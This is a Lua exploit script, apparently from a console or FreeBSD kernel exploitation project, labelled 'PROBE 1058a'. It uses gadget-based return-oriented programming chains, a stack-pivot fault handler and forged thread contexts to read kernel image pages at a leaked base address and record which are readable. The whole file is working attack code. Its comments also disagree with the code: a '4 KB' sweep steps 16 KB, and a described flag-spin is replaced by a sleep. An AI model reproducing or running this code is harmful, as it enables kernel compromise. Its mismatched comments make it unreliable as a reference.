-- CRASH_CLASS: HIGH
-- PROBE 1058a: 4 KB readability sweep over the kernel image (serialised)
--
-- 1056a read the first page of every 2 MB region and found none readable; permissions can
-- differ inside a 2 MB region, so this walks the image at 4 KB. Faults run the shared pivot
-- handler, so two faulting threads at once would clobber it - the first version with a ring
-- of 32 died after eight. This version is strictly serialised: the child (or its handler)
-- sets a flag word, and the parent spins on that word before spawning the next child.
--
--   chain:   pop rax; page; mov rax,[rax]; pop rdi; out[i]; mov [rdi],rax;
--            pop rdi; flag; pop rax; 1; mov [rdi],rax; pop rax; 431; pop rdi; 0; fn
--   handler: store rdx (the context) into flag; thr_exit
--
-- BASE is the image base the oracle reports for this boot; a reboot invalidates it.
local BASE  = 0xFFFFFFFF95000000
local SPAN  = 0x6200000
local START = 0x0
local STOP  = 0x6200000
local STEP  = 0x4000
local N     = math.floor((STOP - START) / STEP)

print("=== PROBE 1058a: 4 KB kernel image readability sweep ===")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function as_addr(t) local s=tostring(t) local m=s:match("0x(%x+)") if m then return tonumber(m,16) end return to_num(t) end
local function wq(a,v) pcall(function() memory.write_qword(uint64(a),uint64(v)) end) end
local function rq(a) local o,v=pcall(function() return memory.read_qword(uint64(a)) end) if o then return to_num(v) end return -1 end
local function hex(v) return string.format("%X", v) end
local function A(x) local ok,v=pcall(function() return as_addr(x) end) if ok and v and v>0 then return v end return 0 end

local sc_pid, sc_mmap, sc_thr = mk(20), mk(477), mk(430)
print(string.format("[0] pid=%d base=%s range=%s..%s step=%d n=%d", to_num(sc_pid(uint64(0))), hex(BASE), hex(START), hex(STOP), STEP, N))

local flagobj = memory.alloc(8)
local flaga = as_addr(flagobj)
wq(flaga, 0)

-- handler: mark completion, then end the thread
local ph = gadgets.stack_pivot[1]
local ctxt = memory.alloc(8)
local hc = ropchain({ stack_base = to_num(ph.pivot_addr) })
hc:push_store_rdx_into_memory(ctxt)
hc:push_syscall_raw(mk(431), function() hc:push_set_rdi(0) end)

local pop_rax = A(gadgets["pop rax; ret"])
local ld_rax  = A(gadgets["mov rax, [rax]; ret"])
local pop_rdi = A(gadgets["pop rdi; ret"])
local st_rdi  = A(gadgets["mov [rdi], rax; ret"])
local fn      = A(syscall.pipe.fn_addr)
if pop_rax==0 or ld_rax==0 or pop_rdi==0 or st_rdi==0 or fn==0 or flaga==0 then
  print("[!] gadget/syscall address missing; aborting"); return
end

local function mmap(px)
    local ok, a = pcall(function() return sc_mmap(uint64(0),uint64(px),uint64(3),uint64(0x1002),uint64(0xFFFFFFFF),uint64(0)) end)
    local v = ok and to_num(a) or 0
    if v ~= 0 and v < 0x800000000000 then for o=0,px-8,8 do wq(v+o,0) end end
    return v
end
local outbase = mmap(0x40000)
local stack   = mmap(0x10000)
local ctx = memory.alloc(0x500); local ctxa = as_addr(ctx)
-- zero the whole context: the reachability gate at +0x0d0 (<=7) and the fields at +0x118
-- must not inherit whatever the allocator returned
if ctxa ~= 0 then for o = 0, 0x4f8, 8 do wq(ctxa + o, 0) end end
local tb  = memory.alloc(8);      local tba  = as_addr(tb)
local ts  = memory.alloc(16);     local tsa  = as_addr(ts)
if outbase==0 or stack==0 or ctxa==0 or tba==0 then print("[!] setup failed"); return end
print(string.format("[1] outs=%X stacks=%X ctx=%X", outbase, stack, ctxa))

local Ctx={MAGIC=0x108,TYPE=0x110,CS=0x0C0,RIP=0x0E0,RSP=0x0F8,SS=0x100,RAX=0x078}
local function probe(i, target)
    local out = outbase + i*8
    -- 0x800 of headroom: the kernel builds the signal frame below the faulting rsp, so a
    -- chain written at the mapping base leaves it unmapped and the child dies without the
    -- handler ever running (pages then look unreadable for a delivery reason, not a page one)
    local sp  = stack + (i % 16) * 0x1000 + 0x800
    -- RIP is the pop_rax gadget, so its operand is slot 1: the first entry is the page,
    -- not the gadget (1008a's measured-good form). A leading pop_rax here would leave the
    -- target in slot 2, where the ret would execute the page as code.
    local ch = { target, ld_rax, pop_rdi, out, st_rdi,
                 pop_rax, 431, pop_rdi, 0, fn }
    for j = 1, #ch do wq(sp + (j-1)*8, ch[j]) end
    wq(out, 0xDEADBEEF)
    wq(ctxa + Ctx.MAGIC, 0x480); wq(ctxa + Ctx.TYPE, 0x10000)
    wq(ctxa + Ctx.CS, 0x43); wq(ctxa + Ctx.SS, 0x3B)
    wq(ctxa + Ctx.RIP, pop_rax); wq(ctxa + Ctx.RSP, sp); wq(ctxa + Ctx.RAX, 20)
    wq(tba, 0)
    local ok = pcall(function() return sc_thr(uint64(ctxa), uint64(tba), uint64(0)) end)
    if not ok then return "spawn-error" end
    if rq(tba) == 0 then return "spawn-refused" end
    wq(tsa, 0); wq(tsa + 8, 60000000)
    pcall(function() return syscall.nanosleep(uint64(tsa), uint64(0)) end)
    return rq(out), 0
end

-- control: a user page must come back with its contents, otherwise the chain is wrong
-- and every zero hit is a chain failure rather than a kernel fact
wq(outbase + N*8, 0xDEADBEEF)
wq(outbase + 0x30000, 0x1122334455667)
local cv = probe(N, outbase + 0x30000)
print(string.format("[C] control=%s want=1122334455667", type(cv)=="number" and hex(cv) or tostring(cv)))
if cv ~= 0x1122334455667 then print("[!] chain control failed; aborting"); return end

local readable, maxturn, stalls, bad = 0, 0, 0, 0
for i = 0, N-1 do
    local v, spins = probe(i, BASE + START + i*STEP)
    local stop = false
    if type(v) == "string" then
        if v == "spawn-refused" or v == "no-completion" then
            stalls = stalls + 1
            if stalls > 8 then print("[" .. i .. "] " .. v .. " x9; aborting"); stop = true end
        else
            bad = bad + 1
            if bad > 8 then print("[" .. i .. "] " .. v .. " x9; aborting"); stop = true end
        end
    end
    if stop then break end
    if spins and spins > maxturn then maxturn = spins end
    if type(v) == "number" and v ~= 0xDEADBEEF then
        readable = readable + 1
        print(string.format("[HIT] %s = %s", hex(BASE + START + i*STEP), hex(v)))
    end
    if i % 64 == 63 then print(string.format("[%d] at=%s readable=%d", i, hex(BASE + START + i*STEP), readable)) end
end
print("[R] readable=" .. readable .. " of " .. N)
print(string.format("[E] alive pid=%d", to_num(sc_pid(uint64(0)))))
print("=== COMPLETE ===")
